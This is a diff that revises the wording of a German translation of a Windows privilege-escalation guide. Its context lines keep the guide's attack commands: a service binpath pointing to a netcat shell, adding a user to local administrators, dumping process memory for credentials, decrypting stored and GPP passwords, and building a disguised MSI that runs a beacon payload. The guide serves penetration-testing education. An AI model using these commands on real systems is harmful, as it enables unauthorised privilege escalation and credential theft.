@@ -85,7 +85,7 @@ set
 dir env:
 Get-ChildItem Env: | ft Key,Value -AutoSize
 ```
-### PowerShell-Historie
+### PowerShell Verlauf
 ```bash
 ConsoleHost_history #Find the PATH where is saved
 
@@ -194,7 +194,7 @@ Für weitere Informationen über den Ablauf des Angriffs überprüfen Sie [https
 
 ## AlwaysInstallElevated
 
-**Wenn** diese 2 Registrierungen **aktiviert** sind (Wert ist **0x1**), können Benutzer mit beliebigen Berechtigungen `*.msi`-Dateien als NT AUTHORITY\\**SYSTEM** **installieren** (ausführen).
+**Wenn** diese 2 Registrierungen **aktiviert** sind (Wert ist **0x1**), können Benutzer mit beliebigen Rechten `*.msi`-Dateien als NT AUTHORITY\\**SYSTEM** **installieren** (ausführen).
 ```bash
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
@@ -235,7 +235,7 @@ create-msi-with-wix.md
 - Geben Sie dem Projekt einen Namen, wie **AlwaysPrivesc**, verwenden Sie **`C:\privesc`** für den Speicherort, wählen Sie **Lösung und Projekt im selben Verzeichnis platzieren** und klicken Sie auf **Erstellen**.
 - Klicken Sie weiter auf **Weiter**, bis Sie zu Schritt 3 von 4 (Dateien auswählen) gelangen. Klicken Sie auf **Hinzufügen** und wählen Sie die gerade generierte Beacon-Payload aus. Klicken Sie dann auf **Fertigstellen**.
 - Markieren Sie das Projekt **AlwaysPrivesc** im **Solution Explorer** und ändern Sie in den **Eigenschaften** **TargetPlatform** von **x86** auf **x64**.
-- Es gibt andere Eigenschaften, die Sie ändern können, wie **Author** und **Manufacturer**, die die installierte App legitimer erscheinen lassen können.
+- Es gibt andere Eigenschaften, die Sie ändern können, wie **Autor** und **Hersteller**, die die installierte App legitimer erscheinen lassen können.
 - Klicken Sie mit der rechten Maustaste auf das Projekt und wählen Sie **Ansicht > Benutzerdefinierte Aktionen**.
 - Klicken Sie mit der rechten Maustaste auf **Installieren** und wählen Sie **Benutzerdefinierte Aktion hinzufügen**.
 - Doppelklicken Sie auf **Anwendungsordner**, wählen Sie Ihre **beacon.exe**-Datei aus und klicken Sie auf **OK**. Dies stellt sicher, dass die Beacon-Payload ausgeführt wird, sobald der Installer gestartet wird.
@@ -282,7 +282,7 @@ reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v U
 ```
 ### LSA-Schutz
 
-Beginnend mit **Windows 8.1** führte Microsoft einen verbesserten Schutz für die Local Security Authority (LSA) ein, um **Versuche** untrusted Prozesse zu **blockieren**, ihren Speicher **zu lesen** oder Code zu injizieren, was das System weiter absichert.\
+Beginnend mit **Windows 8.1** führte Microsoft einen verbesserten Schutz für die Local Security Authority (LSA) ein, um **Versuche** untrusted Prozesse zu **blockieren**, ihren Speicher **zu lesen** oder Code einzuschleusen, was das System weiter absichert.\
 [**Weitere Informationen zum LSA-Schutz hier**](../stealing-credentials/credentials-protections.md#lsa-protection).
 ```bash
 reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
@@ -356,7 +356,7 @@ powershell -command "Get-Clipboard"
 ```
 ## Ausgeführte Prozesse
 
-### Datei- und Ordners Berechtigungen
+### Datei- und Ordnerberechtigungen
 
 Zuerst sollten Sie die Prozesse **auf Passwörter in der Befehlszeile des Prozesses überprüfen**.\
 Überprüfen Sie, ob Sie **eine laufende Binärdatei überschreiben** können oder ob Sie Schreibberechtigungen für den Binärordner haben, um mögliche [**DLL Hijacking-Angriffe**](dll-hijacking/) auszunutzen:
@@ -381,7 +381,7 @@ icacls "%%z"
 )
 )
 ```
-**Überprüfen der Berechtigungen der Ordner der Prozess-Binärdateien (**[**DLL Hijacking**](dll-hijacking/)**)**
+**Überprüfung der Berechtigungen der Ordner der Prozess-Binärdateien (**[**DLL Hijacking**](dll-hijacking/)**)**
 ```bash
 for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
 "system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
@@ -389,17 +389,17 @@ icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone
 todos %username%" && echo.
 )
 ```
-### Speicher-Passwort-Mining
+### Memory Password mining
 
-Sie können einen Speicherauszug eines laufenden Prozesses mit **procdump** von Sysinternals erstellen. Dienste wie FTP haben die **Anmeldeinformationen im Klartext im Speicher**, versuchen Sie, den Speicher auszulesen und die Anmeldeinformationen zu lesen.
+Sie können einen Speicherabbild eines laufenden Prozesses mit **procdump** von Sysinternals erstellen. Dienste wie FTP haben die **Anmeldeinformationen im Klartext im Speicher**, versuchen Sie, den Speicher abzuleiten und die Anmeldeinformationen zu lesen.
 ```bash
 procdump.exe -accepteula -ma <proc_name_tasklist>
 ```
 ### Unsichere GUI-Apps
 
-**Anwendungen, die als SYSTEM ausgeführt werden, können einem Benutzer erlauben, eine CMD zu starten oder Verzeichnisse zu durchsuchen.**
+**Anwendungen, die als SYSTEM ausgeführt werden, können es einem Benutzer ermöglichen, eine CMD zu starten oder Verzeichnisse zu durchsuchen.**
 
-Beispiel: "Windows-Hilfe und -Support" (Windows + F1), suchen Sie nach "Eingabeaufforderung", klicken Sie auf "Klicken Sie hier, um die Eingabeaufforderung zu öffnen"
+Beispiel: "Windows-Hilfe und Support" (Windows + F1), suchen Sie nach "Eingabeaufforderung", klicken Sie auf "Klicken Sie hier, um die Eingabeaufforderung zu öffnen"
 
 ## Dienste
 
@@ -412,7 +412,7 @@ Get-Service
 ```
 ### Berechtigungen
 
-Sie können **sc** verwenden, um Informationen über einen Dienst zu erhalten.
+Sie können **sc** verwenden, um Informationen zu einem Dienst zu erhalten.
 ```bash
 sc qc <service_name>
 ```
@@ -449,7 +449,7 @@ sc.exe config usosvc start= auto
 ```
 ### **Ändern des Dienst-Binärpfads**
 
-In dem Szenario, in dem die Gruppe "Authentifizierte Benutzer" **SERVICE_ALL_ACCESS** für einen Dienst besitzt, ist die Modifikation der ausführbaren Binärdatei des Dienstes möglich. Um **sc** zu ändern und auszuführen:
+In dem Szenario, in dem die Gruppe "Authentifizierte Benutzer" **SERVICE_ALL_ACCESS** für einen Dienst besitzt, ist die Modifikation der ausführbaren Binärdatei des Dienstes möglich. Um **sc** zu modifizieren und auszuführen:
 ```bash
 sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
 sc config <Service_Name> binpath= "net localgroup administrators username /add"
@@ -472,7 +472,7 @@ Berechtigungen können durch verschiedene Berechtigungen erhöht werden:
 
 Für die Erkennung und Ausnutzung dieser Schwachstelle kann das _exploit/windows/local/service_permissions_ verwendet werden.
 
-### Schwache Berechtigungen von Dienstbinaries
+### Schwache Berechtigungen von Dienstbinarys
 
 **Überprüfen Sie, ob Sie die Binary, die von einem Dienst ausgeführt wird, ändern können** oder ob Sie **Schreibberechtigungen für den Ordner** haben, in dem sich die Binary befindet ([**DLL Hijacking**](dll-hijacking/))**.**\
 Sie können jede Binary, die von einem Dienst ausgeführt wird, mit **wmic** (nicht in system32) abrufen und Ihre Berechtigungen mit **icacls** überprüfen:
@@ -517,7 +517,7 @@ appenddata-addsubdirectory-permission-over-service-registry.md
 
 Wenn der Pfad zu einer ausführbaren Datei nicht in Anführungszeichen steht, wird Windows versuchen, jede Endung vor einem Leerzeichen auszuführen.
 
-Zum Beispiel wird Windows für den Pfad _C:\Program Files\Some Folder\Service.exe_ versuchen, Folgendes auszuführen:
+Zum Beispiel wird Windows für den Pfad _C:\Program Files\Some Folder\Service.exe_ versuchen, auszuführen:
 ```powershell
 C:\Program.exe
 C:\Program Files\Some.exe
@@ -568,7 +568,7 @@ Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
 
 Überprüfen Sie, ob Sie eine Konfigurationsdatei ändern können, um eine spezielle Datei zu lesen, oder ob Sie eine Binärdatei ändern können, die von einem Administratorkonto (schedtasks) ausgeführt wird.
 
-Eine Möglichkeit, schwache Ordner-/Dateiberechtigungen im System zu finden, besteht darin:
+Eine Möglichkeit, schwache Ordner-/Dateiberechtigungen im System zu finden, besteht darin, Folgendes zu tun:
 ```bash
 accesschk.exe /accepteula
 # Find all weak folder permissions per drive.
@@ -634,7 +634,7 @@ net share #Check current shares
 ```
 ### hosts-Datei
 
-Überprüfen Sie die anderen bekannten Computer, die in der hosts-Datei fest codiert sind.
+Überprüfen Sie die im hosts-Datei fest codierten anderen bekannten Computer.
 ```
 type C:\Windows\System32\drivers\etc\hosts
 ```
@@ -727,9 +727,9 @@ Beachten Sie, dass mimikatz, lazagne, [credentialfileview](https://www.nirsoft.n
 
 ### DPAPI
 
-Die **Data Protection API (DPAPI)** bietet eine Methode zur symmetrischen Verschlüsselung von Daten, die hauptsächlich im Windows-Betriebssystem zur symmetrischen Verschlüsselung asymmetrischer privater Schlüssel verwendet wird. Diese Verschlüsselung nutzt ein Benutzer- oder Systemgeheimnis, um erheblich zur Entropie beizutragen.
+Die **Data Protection API (DPAPI)** bietet eine Methode zur symmetrischen Verschlüsselung von Daten, die hauptsächlich im Windows-Betriebssystem zur symmetrischen Verschlüsselung von asymmetrischen privaten Schlüsseln verwendet wird. Diese Verschlüsselung nutzt ein Benutzer- oder Systemgeheimnis, um erheblich zur Entropie beizutragen.
 
-**DPAPI ermöglicht die Verschlüsselung von Schlüsseln durch einen symmetrischen Schlüssel, der aus den Anmeldegeheimnissen des Benutzers abgeleitet wird**. In Szenarien mit Systemverschlüsselung verwendet es die Authentifizierungsgeheimnisse der Domäne des Systems.
+**DPAPI ermöglicht die Verschlüsselung von Schlüsseln durch einen symmetrischen Schlüssel, der aus den Anmeldegeheimnissen des Benutzers abgeleitet wird**. In Szenarien mit Systemverschlüsselung verwendet es die Authentifizierungsgeheimnisse des Systems.
 
 Verschlüsselte Benutzer-RSA-Schlüssel, die mit DPAPI erstellt wurden, werden im Verzeichnis `%APPDATA%\Microsoft\Protect\{SID}` gespeichert, wobei `{SID}` den [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) des Benutzers darstellt. **Der DPAPI-Schlüssel, der zusammen mit dem Master-Schlüssel, der die privaten Schlüssel des Benutzers im selben Datei schützt, gespeichert ist**, besteht typischerweise aus 64 Bytes zufälliger Daten. (Es ist wichtig zu beachten, dass der Zugriff auf dieses Verzeichnis eingeschränkt ist, was das Auflisten seines Inhalts über den `dir`-Befehl in CMD verhindert, obwohl es über PowerShell aufgelistet werden kann).
 ```powershell
@@ -738,7 +738,7 @@ Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
 ```
 Sie können das **mimikatz-Modul** `dpapi::masterkey` mit den entsprechenden Argumenten (`/pvk` oder `/rpc`) verwenden, um es zu entschlüsseln.
 
-Die **von dem Master-Passwort geschützten Anmeldeinformationsdateien** befinden sich normalerweise in:
+Die **von dem Master-Passwort geschützten Anmeldeinformationen-Dateien** befinden sich normalerweise in:
 ```powershell
 dir C:\Users\username\AppData\Local\Microsoft\Credentials\
 dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
@@ -754,9 +754,9 @@ dpapi-extracting-passwords.md
 
 ### PowerShell-Anmeldeinformationen
 
-**PowerShell-Anmeldeinformationen** werden häufig für **Scripting** und Automatisierungsaufgaben verwendet, um verschlüsselte Anmeldeinformationen bequem zu speichern. Die Anmeldeinformationen sind durch **DPAPI** geschützt, was normalerweise bedeutet, dass sie nur von demselben Benutzer auf demselben Computer entschlüsselt werden können, auf dem sie erstellt wurden.
+**PowerShell-Anmeldeinformationen** werden häufig für **Skripting** und Automatisierungsaufgaben verwendet, um verschlüsselte Anmeldeinformationen bequem zu speichern. Die Anmeldeinformationen sind durch **DPAPI** geschützt, was normalerweise bedeutet, dass sie nur von demselben Benutzer auf demselben Computer entschlüsselt werden können, auf dem sie erstellt wurden.
 
-Um **PS-Anmeldeinformationen** aus der Datei, die sie enthält, zu **entschlüsseln**, können Sie Folgendes tun:
+Um eine PS-Anmeldeinformation aus der Datei, die sie enthält, zu **entschlüsseln**, können Sie Folgendes tun:
 ```powershell
 PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
 PS C:\> $credential.GetNetworkCredential().username
@@ -914,7 +914,7 @@ Wenn der `ssh-agent`-Dienst nicht läuft und Sie möchten, dass er beim Booten a
 Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
 ```
 > [!NOTE]
-> Es scheint, dass diese Technik nicht mehr gültig ist. Ich habe versucht, einige SSH-Schlüssel zu erstellen, sie mit `ssh-add` hinzuzufügen und mich über SSH bei einer Maschine anzumelden. Der Registrierungsschlüssel HKCU\Software\OpenSSH\Agent\Keys existiert nicht und Procmon hat die Verwendung von `dpapi.dll` während der asymmetrischen Schlüsselauthentifizierung nicht identifiziert.
+> Es scheint, dass diese Technik nicht mehr gültig ist. Ich habe versucht, einige SSH-Schlüssel zu erstellen, sie mit `ssh-add` hinzuzufügen und mich über SSH bei einer Maschine anzumelden. Der Registrierungsschlüssel HKCU\Software\OpenSSH\Agent\Keys existiert nicht und procmon hat die Verwendung von `dpapi.dll` während der asymmetrischen Schlüsselauthentifizierung nicht identifiziert.
 
 ### Unattended files
 ```
@@ -980,7 +980,7 @@ Suchen Sie nach einer Datei namens **SiteList.xml**
 
 Eine Funktion war zuvor verfügbar, die die Bereitstellung von benutzerdefinierten lokalen Administratorkonten auf einer Gruppe von Maschinen über Gruppenrichtlinienpräferenzen (GPP) ermöglichte. Diese Methode hatte jedoch erhebliche Sicherheitsmängel. Erstens konnten die Gruppenrichtlinienobjekte (GPOs), die als XML-Dateien in SYSVOL gespeichert sind, von jedem Domänenbenutzer zugegriffen werden. Zweitens konnten die Passwörter innerhalb dieser GPPs, die mit AES256 unter Verwendung eines öffentlich dokumentierten Standard-Schlüssels verschlüsselt waren, von jedem authentifizierten Benutzer entschlüsselt werden. Dies stellte ein ernsthaftes Risiko dar, da es Benutzern ermöglichen konnte, erhöhte Berechtigungen zu erlangen.
 
-Um dieses Risiko zu mindern, wurde eine Funktion entwickelt, die nach lokal zwischengespeicherten GPP-Dateien sucht, die ein "cpassword"-Feld enthalten, das nicht leer ist. Bei Auffinden einer solchen Datei entschlüsselt die Funktion das Passwort und gibt ein benutzerdefiniertes PowerShell-Objekt zurück. Dieses Objekt enthält Details über die GPP und den Speicherort der Datei, was bei der Identifizierung und Behebung dieser Sicherheitsanfälligkeit hilft.
+Um dieses Risiko zu mindern, wurde eine Funktion entwickelt, die nach lokal zwischengespeicherten GPP-Dateien sucht, die ein nicht leeres "cpassword"-Feld enthalten. Bei Auffinden einer solchen Datei entschlüsselt die Funktion das Passwort und gibt ein benutzerdefiniertes PowerShell-Objekt zurück. Dieses Objekt enthält Details über die GPP und den Speicherort der Datei, was bei der Identifizierung und Behebung dieser Sicherheitsanfälligkeit hilft.
 
 Suchen Sie in `C:\ProgramData\Microsoft\Group Policy\history` oder in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (vor W Vista)_ nach diesen Dateien:
 
@@ -996,7 +996,7 @@ Suchen Sie in `C:\ProgramData\Microsoft\Group Policy\history` oder in _**C:\Docu
 #To decrypt these passwords you can decrypt it using
 gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
 ```
-Verwendung von crackmapexec, um die Passwörter zu erhalten:
+Verwendung von crackmapexec zum Abrufen der Passwörter:
 ```bash
 crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
 ```
@@ -1170,7 +1170,7 @@ Tools zum Extrahieren von Passwörtern aus Browsern:
 
 **Component Object Model (COM)** ist eine Technologie, die im Windows-Betriebssystem integriert ist und die **Interkommunikation** zwischen Softwarekomponenten verschiedener Sprachen ermöglicht. Jede COM-Komponente wird **über eine Klassen-ID (CLSID)** identifiziert, und jede Komponente bietet Funktionalität über eine oder mehrere Schnittstellen, die über Schnittstellen-IDs (IIDs) identifiziert werden.
 
-COM-Klassen und -Schnittstellen sind in der Registry unter **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** und **HKEY\_**_**CLASSES\_**_**ROOT\Interface** definiert. Diese Registry wird erstellt, indem **HKEY\_**_**LOCAL\_**_**MACHINE\Software\Classes** + **HKEY\_**_**CURRENT\_**_**USER\Software\Classes** = **HKEY\_**_**CLASSES\_**_**ROOT** zusammengeführt werden.
+COM-Klassen und -Schnittstellen sind in der Registry unter **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** und **HKEY\_**_**CLASSES\_**_**ROOT\Interface** definiert. Diese Registry wird erstellt, indem **HKEY\_**_**LOCAL\_**_**MACHINE\Software\Classes** + **HKEY\_**_**CURRENT\_**_**USER\Software\Classes** = **HKEY\_**_**CLASSES\_**_**ROOT** zusammengeführt wird.
 
 Innerhalb der CLSIDs dieser Registry finden Sie die untergeordnete Registry **InProcServer32**, die einen **Standardwert** enthält, der auf eine **DLL** verweist, und einen Wert namens **ThreadingModel**, der **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single oder Multi) oder **Neutral** (Thread Neutral) sein kann.
 
@@ -1178,7 +1178,7 @@ Innerhalb der CLSIDs dieser Registry finden Sie die untergeordnete Registry **In
 
 Im Grunde genommen, wenn Sie **eine der DLLs überschreiben können**, die ausgeführt werden sollen, könnten Sie **Privilegien eskalieren**, wenn diese DLL von einem anderen Benutzer ausgeführt wird.
 
-Um zu erfahren, wie Angreifer COM Hijacking als Persistenzmechanismus verwenden, überprüfen Sie:
+Um zu erfahren, wie Angreifer COM Hijacking als Persistenzmechanismus nutzen, überprüfen Sie:
 
 {{#ref}}
 com-hijacking.md
@@ -1221,7 +1221,7 @@ Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
 ## Leaked Handlers
 
 Stellen Sie sich vor, dass **ein Prozess, der als SYSTEM ausgeführt wird, einen neuen Prozess** (`OpenProcess()`) mit **voller Zugriffsberechtigung** öffnet. Der gleiche Prozess **erstellt auch einen neuen Prozess** (`CreateProcess()`) **mit niedrigen Berechtigungen, der jedoch alle offenen Handles des Hauptprozesses erbt**.\
-Wenn Sie dann **vollen Zugriff auf den niedrig privilegierten Prozess** haben, können Sie das **offene Handle zum privilegierten Prozess, das mit `OpenProcess()` erstellt wurde**, ergreifen und **einen Shellcode injizieren**.\
+Wenn Sie dann **vollen Zugriff auf den niedrig privilegierten Prozess** haben, können Sie das **offene Handle zum privilegierten Prozess, das mit `OpenProcess()` erstellt wurde**, ergreifen und **Shellcode injizieren**.\
 [Lesen Sie dieses Beispiel für weitere Informationen darüber, **wie man diese Schwachstelle erkennt und ausnutzt**.](leaked-handle-exploitation.md)\
 [Lesen Sie diesen **anderen Beitrag für eine umfassendere Erklärung, wie man mehr offene Handles von Prozessen und Threads mit unterschiedlichen Berechtigungsstufen (nicht nur voller Zugriff) testet und missbraucht**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).
 
@@ -1233,7 +1233,7 @@ Windows bietet eine Funktion namens **Named Pipes**, die es nicht verwandten Pro
 
 Wenn Daten durch eine Pipe von einem **Client** gesendet werden, hat der **Server**, der die Pipe eingerichtet hat, die Möglichkeit, die **Identität** des **Clients** zu **übernehmen**, vorausgesetzt, er hat die erforderlichen **SeImpersonate**-Rechte. Die Identifizierung eines **privilegierten Prozesses**, der über eine Pipe kommuniziert und den Sie nachahmen können, bietet die Möglichkeit, **höhere Berechtigungen zu erlangen**, indem Sie die Identität dieses Prozesses annehmen, sobald er mit der von Ihnen eingerichteten Pipe interagiert. Anleitungen zur Durchführung eines solchen Angriffs finden Sie in hilfreichen Leitfäden [**hier**](named-pipe-client-impersonation.md) und [**hier**](./#from-high-integrity-to-system).
 
-Außerdem ermöglicht das folgende Tool, **eine Named Pipe-Kommunikation mit einem Tool wie Burp abzufangen:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **und dieses Tool ermöglicht es, alle Pipes aufzulisten und zu sehen, um Privilegien zu erlangen** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)
+Außerdem ermöglicht das folgende Tool, **eine Named Pipe-Kommunikation mit einem Tool wie Burp abzufangen:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **und dieses Tool ermöglicht es, alle Pipes aufzulisten und zu sehen, um Privilegien zu finden** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)
 
 ## Misc
 
@@ -1309,7 +1309,7 @@ Lesen Sie dies, um **über Integritätsstufen zu lernen**:
 integrity-levels.md
 {{#endref}}
 
-Lesen Sie dann **dies, um über UAC und UAC-Bypässe zu lernen:**
+Lesen Sie dann **dies, um über UAC und UAC-Umgehungen zu lernen:**
 
 {{#ref}}
 ../authentication-credentials-uac-and-efs/uac-user-account-control.md
@@ -1319,14 +1319,14 @@ Lesen Sie dann **dies, um über UAC und UAC-Bypässe zu lernen:**
 
 ### **Neuer Dienst**
 
-Wenn Sie bereits auf einem High Integrity-Prozess laufen, kann der **Übergang zu SYSTEM** einfach sein, indem Sie **einen neuen Dienst erstellen und ausführen**:
+Wenn Sie bereits in einem High Integrity-Prozess laufen, kann der **Übergang zu SYSTEM** einfach sein, indem Sie **einen neuen Dienst erstellen und ausführen**:
 ```
 sc create newservicename binPath= "C:\windows\system32\notepad.exe"
 sc start newservicename
 ```
 ### AlwaysInstallElevated
 
-Von einem High Integrity-Prozess aus könnten Sie versuchen, die **AlwaysInstallElevated-Registrierungseinträge** zu **aktivieren** und eine Reverse-Shell mit einem _**.msi**_-Wrapper zu **installieren**.\
+Von einem High Integrity-Prozess aus könnten Sie versuchen, die **AlwaysInstallElevated-Registrierungseinträge zu aktivieren** und eine Reverse-Shell mit einem _**.msi**_-Wrapper zu **installieren**.\
 [Weitere Informationen zu den beteiligten Registrierungsschlüsseln und wie man ein _.msi_-Paket installiert, finden Sie hier.](./#alwaysinstallelevated)
 
 ### High + SeImpersonate-Berechtigung zu System
@@ -1362,9 +1362,9 @@ Wenn es Ihnen gelingt, eine **dll** zu **hijacken**, die von einem **Prozess** a
 
 [Statische Impacket-Binärdateien](https://github.com/ropnop/impacket_static_binaries)
 
-## Nützliche Tools
+## Nützliche Werkzeuge
 
-**Bestes Tool zur Suche nach Windows-Privilegieneskalationsvektoren:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
+**Das beste Tool, um nach Windows-Privilegieneskalationsvektoren zu suchen:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
 
 **PS**
 
@@ -1376,7 +1376,7 @@ Wenn es Ihnen gelingt, eine **dll** zu **hijacken**, die von einem **Prozess** a
 [**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Extrahiert Anmeldeinformationen aus dem Anmeldeinformations-Manager. Erkannt.**\
 [**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Sprühen Sie gesammelte Passwörter über die Domain**\
 [**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh ist ein PowerShell ADIDNS/LLMNR/mDNS/NBNS-Spoofer und Man-in-the-Middle-Tool.**\
-[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Grundlegende Privilegieneskalation Windows-Enumeration**\
+[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Grundlegende Privilegieneskalation Windows-Einordnung**\
 [~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- Suchen Sie nach bekannten Privilegieneskalationsanfälligkeiten (DEPRECATED für Watson)\
 [~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokale Überprüfungen **(Benötigt Administratorrechte)**
 
@@ -1391,7 +1391,7 @@ Wenn es Ihnen gelingt, eine **dll** zu **hijacken**, die von einem **Prozess** a
 
 **Bat**
 
-[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Tool, das auf diesem Beitrag basiert (es benötigt keinen accesschk, um richtig zu funktionieren, kann ihn aber verwenden).
+[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Tool, das auf diesem Beitrag basiert (es benötigt keinen accesschk, um ordnungsgemäß zu funktionieren, kann ihn aber verwenden).
 
 **Local**
 
